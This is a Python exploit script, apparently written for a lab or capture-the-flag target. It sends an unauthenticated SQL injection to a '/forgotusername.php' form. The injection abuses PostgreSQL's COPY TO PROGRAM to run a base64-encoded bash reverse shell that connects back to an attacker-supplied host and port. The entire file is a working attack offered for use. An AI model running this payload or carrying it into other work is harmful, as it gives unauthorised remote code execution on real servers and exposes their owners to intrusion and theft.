#!/usr/bin/env python3

import requests
import base64
import argparse
import traceback
from urllib.parse import urljoin

def pgsql_invoke_system_binaries(target, lhost, lport):
    url = urljoin(target, "/forgotusername.php")
    
    # Base64 encode the reverse shell command
    cmd = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    b64_cmd = base64.b64encode(cmd.encode()).decode()
    sqli_payload = f"""'; COPY (SELECT 1) TO PROGRAM 'echo {b64_cmd} | base64 -d | bash'; --"""
    print("[+] SQLi Payload: ", sqli_payload)
    data = {"username": sqli_payload}
    try:
        print(f"[+] SQLi payload sent, check your listener {lhost}:{lport}")
        response = requests.post(url, data=data)
    except Exception as e:
        print("[-] Error sending the forget username request: ", e)
        traceback.print_exc()

def main():
    parser = argparse.ArgumentParser(description="Use the PostgreSQL `COPY` function to execute system level commands and gain code execution on the target machine (unauthenticated)")
    parser.add_argument("target", help="Target's base URL (e.g, http://192.168.174.234:80/)")
    parser.add_argument("lhost", help='Attacker IP address')
    parser.add_argument("lport", help="Listener port")
    args = parser.parse_args()

    pgsql_invoke_system_binaries(args.target, args.lhost, args.lport)

if __name__ == "__main__":
    main()
